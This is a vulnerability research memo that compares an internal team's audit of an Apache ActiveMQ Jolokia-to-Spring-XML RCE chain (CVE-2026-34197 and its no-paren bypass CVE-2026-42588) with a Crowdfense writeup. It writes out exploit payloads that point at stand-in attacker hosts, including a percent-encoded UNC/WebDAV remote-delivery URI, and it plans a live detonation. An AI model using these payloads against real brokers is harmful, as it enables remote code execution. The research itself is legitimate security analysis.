# ActiveMQ CVE-2026-34197 RCE-bypass — RAPTOR prior work vs. Crowdfense writeup

**Date:** 2026-07-04
**Article compared:** https://www.crowdfense.com/apache-activemq-rce-bypass/ ("Apache ActiveMQ RCE Bypass (CVE-2026-34197)")
**Our artifacts:** `out/cve-2026-34197-activemq/` (original, Apr 8/17), `out/projects/activemq-research/` (re-audit, Apr 30), `out/activemq-reaudit/` (42588/42253 live, Jun 2), `out/projects/activemq-6.2.6-hunt/` (auto-research audit, Jun 21). Source trees: `out/activemq-reaudit/src-5.19.6/`, `targets/activemq-6.2.6/`.
**Method of this comparison:** 3 parallel source-verification agents; every parity/gap claim below checked against the exact checked-out code at file:line.

---

## TL;DR

The Crowdfense article and our work describe **the same vulnerability chain** — the Jolokia `addNetworkConnector` → `vm://?brokerConfig=xbean:` → Spring XML → `ProcessBuilder` RCE, and specifically the **patch-bypass of CVE-2026-34197** that we tracked as **CVE-2026-42588**.

- **We independently found their "first bypass" (no-paren composite URI) and it matches at the source level exactly.** Verified in 5.19.6 `URISupport`/`BrokerView`.
- **Our 6.2.6 fix analysis matches theirs exactly** — same two commits (`c1b44af11`, `c2fc7a1d6`). Verified present in `targets/activemq-6.2.6/`.
- **They went further than us in one place: the "second bypass"** — percent-encoded `file:` URI → Windows UNC path → WebDAV mini-redirector → fully-remote payload delivery past the `{file,classpath}` allow-list. We hit that same allow-list and worked around it with a **local file** (`xbean:/tmp/evil.xml`) instead. **The classifier flaw they exploit is real and present in our exact source** (`Utils.java:123-129`), but the remote-delivery half is **Windows-only** and our lab was Linux — so it was not a gap in our lab result, but it *is* a technique we didn't discover and a capability we haven't demonstrated.
- **We went further than them in breadth**: live end-to-end root RCE on a 4-image version matrix, the `<6.0.0`/`6.0.0-6.1.1 unauth`/`6.1.2+` auth breakdown, the 5.19.x branch, and — in the 6.2.6 audit — 10+ net-new findings beyond this chain.

---

## 1. Timeline of our ActiveMQ work (so "our work" is unambiguous)

| When | Dir | What |
|---|---|---|
| Apr 8 + Apr 17 | `out/cve-2026-34197-activemq/` | **Original 34197 reproduction.** Lab `apache/activemq-classic:5.18.6`. Payload always **parenthesized + remote**: `static:(vm://evil?brokerConfig=xbean:http://ATTACKER/evil.xml)`. PoC scripts present; no execution log in-dir. |
| Apr 30 | `out/projects/activemq-research/` | Re-audit; **confirmed root RCE** (`uid=0`) on 4 images: 5.18.3, 5.18.6, 6.1.4, 6.1.7. Regression/version matrix. |
| Jun 2 | `out/activemq-reaudit/` | **Found the no-paren bypass = CVE-2026-42588.** Reproduced live root RCE on 34197-patched **5.19.6** and on 6.2.0. |
| Jun 21 | `out/projects/activemq-6.2.6-hunt/` | Auto-research audit of 6.2.6: chain **closed twice**, plus 10+ net-new lower-sev findings. |

**Important:** in the **original** work (Apr) we only reproduced the public CVE with a parenthesized composite. We discovered the **no-paren bypass** only in the **Jun 2 re-audit**. Neither the percent-encoding nor any UNC/WebDAV technique appears anywhere in any of our dirs (grep-confirmed: zero hits for `%2f`, `UNC`, `WebDAV`).

---

## 2. Head-to-head: the three-layer defense, and how each side defeats each layer

Both accounts converge on the same three defensive layers between an authenticated Jolokia caller and RCE on a hardened broker. The only real divergence is **Layer 2**.

| Layer | Where | Crowdfense defeats it by | We defeat it by |
|---|---|---|---|
| **1. Transport-scheme denylist** (`BrokerView.DENIED_TRANSPORT_SCHEMES`, the 34197 fix) | `BrokerView.validateAllowedUri` gated on `URISupport.isCompositeURI` (paren-anchored) | **No-paren composite** `static:vm://EVIL?brokerConfig=xbean:...` | **Same — no-paren composite.** Independent discovery, identical root cause |
| **2. xbean remote-XML protocol allow-list** (`{file,classpath}` only, hardening #1910) | **Percent-encode the slashes** (`file:%2f%2f…` / multi-encoded) → classifier sees plain `file:` → JDK decodes to `//ATTACKER/SHARE` UNC → **WebDAV mini-redirector fetches over HTTP** (Windows-only, fully remote) | **Local file payload** `xbean:/tmp/evil.xml` (needs a local write primitive; OS-agnostic) |
| **3. VMTransportFactory scheme allow-list** (`broker,properties`, the **42588 / 6.2.6 fix**) | Acknowledged as the fix that kills the chain | **Same** — we identified this as the sink-layer fix that ends the chain regardless of Layers 1–2 |

---

## 3. Source-verified parity (Layer 1 + the 6.2.6 fix)

**Layer-1 bypass — CONFIRMED identical to ours.** `out/activemq-reaudit/src-5.19.6/.../util/URISupport.java:293-300`:
```java
public static boolean isCompositeURI(URI uri) {
    String ssp = stripPrefix(uri.getRawSchemeSpecificPart().trim(), "//").trim();
    if (ssp.indexOf('(') == 0 && checkParenthesis(ssp)) { return true; }
    return false;
}
```
`BrokerView.validateAllowedUri:575-600` recurses **only** when `isCompositeURI(uri)` is true (paren-anchored), while `parseComposite` (line 382-385 `else` branch) treats a paren-free ssp as a single component and still extracts the inner `vm://…`. `static` is absent from `DENIED_TRANSPORT_SCHEMES` (line 47-49). Classifier and extractor disagree → the inner `vm` scheme is never checked. This is our finding, verbatim.

**6.2.6 fix — CONFIRMED matches Crowdfense's two commits.**
- `c1b44af11` "Handle validation for Composite URIs without parens": `BrokerView.validateAllowedUri:615-653` now calls `URISupport.parseComposite(uri)` **unconditionally** and recurses on every component with a non-null scheme — the `isCompositeURI` gate is gone. (Code comment at 625-627 literally names the "misses if there are no parentheses" bug.)
- `c2fc7a1d6` "Block the XBeanBrokerFactory by default": `VMTransportFactory.java:52` `DEFAULT_ALLOWED_SCHEMES = "broker,properties"`, enforced at `validateBrokerCreationSchema` (186-198) **before** `BrokerFactory.createBroker` (line 146) → `xbean` rejected by default.

Our 6.2.6 audit report reached this exact conclusion independently ("closed twice by default").

---

## 4. The one real gap: Crowdfense's Layer-2 "second bypass"

**What it is:** the #1910 hardening classifies an xbean URI as remote-vs-local with a **raw literal-prefix match on the undecoded string**. Verified byte-identical in **both** 5.19.6 and 6.2.6 at `Utils.java:123-129`:
```java
private static boolean isQualifiedRemoteFile(String uri) {
    return uri.startsWith(FILE_PROTOCOL + "://") || uri.startsWith(FILE_PROTOCOL + ":\\\\");
}
```
`getProtocolFromScheme` (118-121) returns `REMOTE_FILE_PROTOCOL` only if that literal match hits; otherwise `new URI(uri).getScheme()` → `"file"`, which **is** in the `{file,classpath}` allow-list → passes. So `file:%2f%2fATTACKER/SHARE/p.xml` is misclassified as an ordinary local `file` and sails through `validateUrlAllowed` (97-113), whereas literal `http://` throws `protocol 'http' … not allowed`.

**This is exactly the check that forced our local-file workaround.** `REAUDIT-REPORT.md:51` — *"remote `http://` payload blocked by `Utils` (`protocol 'http' not allowed`)"* → we fell back to `xbean:/tmp/evil.xml` (line 52). Source-confirmed: same code, same reason.

**Honest scoping of the gap (verified, not hand-waved):**
- The classifier flaw is **real and reachable** at the exact 5.19.6 sink we already proved RCE through. ✅
- The percent-encoding half is a genuine allow-list bypass **we did not discover** — conceptually absent from all our dirs. ✅ (this is the research delta in their favor)
- BUT the remote-delivery half (`//host/share` → SMB → **WebDAV mini-redirector** → HTTP fetch) is **Windows-only** OS behavior. Our 5.19.6 lab ran on **Linux** (`eclipse-temurin`), where `//ATTACKER/SHARE` collapses to a local path — no remote fetch. So on the lab we actually used, this technique **could not** have delivered a remote payload; the local-file workaround was the correct and only Linux-valid remote-equivalent. It is **not** a hole in our lab's RCE proof.
- Caveat flagged by the verifier: the exact multi-encoding depth in their illustrative payload (`%2525252f`, ~4 decode passes) vs. a single `%2f` is a runtime/JDK-decode-count question we can't settle from Java source alone. The *classifier* bypass is confirmed; the precise encoding depth for the Windows path is a live-test detail.

**Net:** Crowdfense found a **novel, fully-remote, allow-list-defeating delivery** for this chain that we didn't. It doesn't change any result we published (Linux), but it's a capability we should be able to demonstrate — see follow-up.

---

## 5. Where we went further than the article

- **Live end-to-end root RCE on a version matrix** (`uid=0` on 5.18.3 / 5.18.6 / 6.1.4 / 6.1.7 at Apr-30; 5.19.6 + 6.2.0 at Jun-2). The article is a single-chain technique writeup.
- **Auth breakdown by version**: `<6.0.0` needs `admin:admin`; **`6.0.0–6.1.1` fully unauth via CVE-2024-32114**; `6.1.2+` re-authed; Jolokia `Origin`-header/strict-CORS requirement documented. (Crowdfense frames it flatly as "post-auth.")
- **5.19.x branch coverage** (5.19.6 patched vs 5.19.7 fixed) — the article stays on the 6.2.x line.
- **Breadth beyond this chain** (6.2.6 auto-research audit): durable-subscription cross-clientId **IDOR** (`removeSubscription` un-gated in `AuthorizationBroker`), a systemic console output-encoding injection family (~7 sinks), a `static:` denylist-gap **SSRF**, Shiro colon-injection verb-escalation, LDAP empty-password anon-bind, etc. None of this is in scope for the single-chain article.

## 6. Where the article is stronger

- The **percent-encoded UNC → WebDAV** Layer-2 bypass (§4) — deeper single-chain tradecraft than our local-file workaround; achieves **remote payload delivery with no pre-existing file-write primitive** on Windows targets.
- The `ATTACKER@PORT` WebDAV syntax to force HTTP on a non-standard port.

## 7. Naming reconciliation

The article headlines everything under **CVE-2026-34197** and calls the two techniques "bypasses." We track the **no-paren bypass as its own CVE-2026-42588** (the CVE whose fix is the `VMTransportFactory` scheme gate in 5.19.7/6.2.6). Same vulnerability, different label granularity. Their Layer-2 percent-encoding bypass targets the separate #1910 xbean allow-list hardening.

---

## 8. Concrete follow-up (the actionable delta)

Stand up a **Windows-hosted** ActiveMQ **5.19.6** (or any 34197-patched, pre-5.19.7/6.2.6 build) broker reachable through the same `static:vm://…?brokerConfig=xbean:` sink, run an SMB/WebDAV listener, and detonate `xbean:file:%2f%2fATTACKER@PORT/share/p.xml` (tuning the encoding depth empirically). Goal: demonstrate **fully-remote RCE past the `{file,classpath}` allow-list** — the one capability the article has that our engagement hasn't shown. 6.2.6 is **not** a valid target (VMTransportFactory scheme gate kills it before `Utils` runs — verified).
